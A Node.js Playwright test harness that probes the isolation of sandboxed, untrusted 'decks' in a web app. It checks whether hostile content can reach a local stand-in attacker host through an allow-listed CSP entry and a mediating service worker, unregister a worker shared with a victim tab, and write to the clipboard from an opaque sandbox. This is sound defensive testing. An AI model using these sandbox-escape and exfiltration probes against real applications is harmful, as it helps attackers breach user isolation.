// Q6 + leftovers: worker mediation of cross-origin requests, allow-listed "CDN" host, unregister under CSP, clipboard in the opaque sandbox.
const L = require('./lib.cjs'); const fs = require('node:fs'); const H = require('./hostile/battery.js');
const APP = 'http://localhost:4620'; const PLAYER = 'http://127.0.0.1:4622'; const EVIL = 'http://127.0.0.2:4630'; const cfgBase = { evil: EVIL, stun: 'stun:127.0.0.2:4631', tcp: 'http://127.0.0.2:4632', wt: 'https://127.0.0.2:4633' };
const CDNCSP = `default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: ${EVIL}; style-src 'self' 'unsafe-inline' ${EVIL}; font-src 'self' data: ${EVIL}; connect-src 'self'; frame-src 'self' data: blob:; object-src 'none'; base-uri 'self'; form-action 'none'`;
(async () => {
  const app = await L.startStatic(4620, L.DIR + '/app'); const player = await L.startStatic(4622, L.DIR + '/player2'); const evil = await L.startEvil(4630); const udp = await L.startUdp(4631);
  const browser = await L.realLaunch(); const out = { version: browser.version(), runs: {} };
  const open = async (context, opts) => { const page = await context.newPage(); await page.goto(`${APP}/app.html?player=${encodeURIComponent(PLAYER)}&fsrc=1`); const o = await page.evaluate((x) => window.openV2(x), { files: H.files, ...opts }); return { page, frame: page.frames().find((f) => f.url().includes('/vfs/')), o }; };
  const batteryRun = async (run, opts, extra) => { const context = await browser.newContext(); const { frame } = await open(context, opts); const u0 = udp.log.length; let results; try { results = await frame.evaluate(H.battery, { ...cfgBase, run }); } catch (e) { results = { error: e.message.split('\n')[0] }; }
    const more = extra ? await frame.evaluate(extra, { evil: EVIL, run }).catch((e) => 'ERR ' + e.message.split('\n')[0]) : undefined; await L.sleep(3000); const hits = evil.log.filter((l) => l.run === run);
    out.runs[run] = { reachedAttacker: [...new Set(hits.map((l) => l.c))], stunPackets: udp.log.length - u0, more, results }; await context.close(); };
  try {
    await batteryRun('M-no-CSP-worker-mediates', { headers: { 'Cache-Control': 'no-store' }, mediate: true });
    await batteryRun('N1-cdn-host-allow-listed-direct', { headers: { 'Content-Security-Policy': CDNCSP, 'Referrer-Policy': 'no-referrer' } });
    await batteryRun('N2-cdn-host-allow-listed-worker-mediates', { headers: { 'Content-Security-Policy': CDNCSP, 'Referrer-Policy': 'no-referrer' }, mediate: true, ext: { [EVIL + '/lib.js']: 'self.__localised = "served from worker memory";' } },
      (c) => new Promise((res) => { const s = document.createElement('script'); s.src = c.evil + '/lib.js?c=localised-lib&run=' + c.run; s.onload = () => res('lib.js load, __localised=' + self.__localised); s.onerror = () => res('lib.js error'); document.head.append(s); }));
    { // U: hostile deck (fixed offline policy) unregisters the worker while a victim deck is open in another tab
      const context = await browser.newContext(); const a = await open(context, { files: { 'index.html': '<!doctype html><title>Victim A</title><h1>A</h1>', 'sub.html': 'sub A' } }); const h = await open(context, {});
      const r = { hostile: await h.frame.evaluate(async () => { const regs = await navigator.serviceWorker.getRegistrations(); return { regs: regs.length, unregister: (await Promise.all(regs.map((x) => x.unregister()))).join(','), ownFetchAfter: await fetch('sub.html').then((x) => x.status, (e) => 'ERR ' + e.message), controllerAfter: !!navigator.serviceWorker.controller }; }).catch((e) => 'ERR ' + e.message.split('\n')[0]) };
      await L.sleep(500); r.victimFetchAfter = await a.frame.evaluate(() => fetch('sub.html').then((x) => 'sub.html ' + x.status)).catch((e) => 'ERR ' + e.message.split('\n')[0]);
      r.victimNewNavigation = await a.page.evaluate(() => new Promise((res) => { const f = window.__frame; f.addEventListener('load', () => res('frame load event'), { once: true }); f.src = f.src.replace('index.html', 'sub.html'); setTimeout(() => res('no load'), 3000); })); await L.sleep(300);
      r.victimFrameAfterNavigation = await a.page.frames().filter((f) => f !== a.page.mainFrame()).map((f) => f.url().replace(/vfs\/[0-9a-f]+/, 'vfs/T'))[0]; r.victimFrameBody = await a.page.frames().find((f) => f !== a.page.mainFrame()).evaluate(() => document.body.innerText.slice(0, 40)).catch((e) => 'ERR');
      const b = await open(context, { files: { 'index.html': '<!doctype html><title>Victim B</title><h1>B</h1>' } }); r.nextDeckAfterReboot = { bootReport: b.o.bootInfo.report, title: b.frame ? await b.frame.title() : 'no frame' }; out.runs['U-unregister-under-fixed-policy'] = r; await context.close(); }
    { // O: clipboard write from the CURRENT opaque sandbox design (sandbox="allow-scripts", same allow attribute as the site)
      const context = await browser.newContext(); await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: APP }).catch(() => {}); const page = await context.newPage(); await page.goto(`${APP}/app.html?player=${encodeURIComponent(PLAYER)}`);
      await page.evaluate(() => new Promise((res) => { const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.setAttribute('allow', "camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none'; fullscreen 'none'"); addEventListener('message', (e) => { if (e.data && e.data.type === 'opaque-loaded') res(); }); f.src = 'opaque.html'; document.getElementById('stage').replaceChildren(f); }));
      const f = page.frames().find((x) => x.url().includes('opaque.html')); await f.locator('body').click({ position: { x: 20, y: 20 } }).catch(() => {});
      const r = { execCommandCopy: await f.evaluate(() => { const ta = document.createElement('textarea'); ta.value = 'OPAQUE-EXEC-COPY'; document.body.append(ta); ta.select(); const ok = document.execCommand('copy'); ta.remove(); return ok; }).catch((e) => 'ERR ' + e.message.split('\n')[0]) };
      await page.locator('#draft').click().catch(() => {}); r.appClipboardAfter = await page.evaluate(() => navigator.clipboard.readText()).catch((e) => 'unreadable'); out.runs['O-opaque-sandbox-clipboard'] = r; await context.close(); }
  } catch (e) { out.error = String(e.stack).slice(0, 500); }
  finally { await Promise.race([browser.close(), L.sleep(5000)]); for (const s of [app, player, evil, udp]) await s.close(); }
  fs.writeFileSync(`${L.DIR}/out/q6.json`, JSON.stringify(out, null, 1));
  for (const [k, v] of Object.entries(out.runs)) { console.log('=== ' + k); if (v.reachedAttacker) console.log(' reached:', v.reachedAttacker.join(', '), '| STUN', v.stunPackets, '| more:', v.more, '| script:', v.results.script, '| fetch:', v.results.fetch, '| worker-file:', v.results['worker-file']); else console.log(JSON.stringify(v)); }
  if (out.error) console.log(out.error);
})();
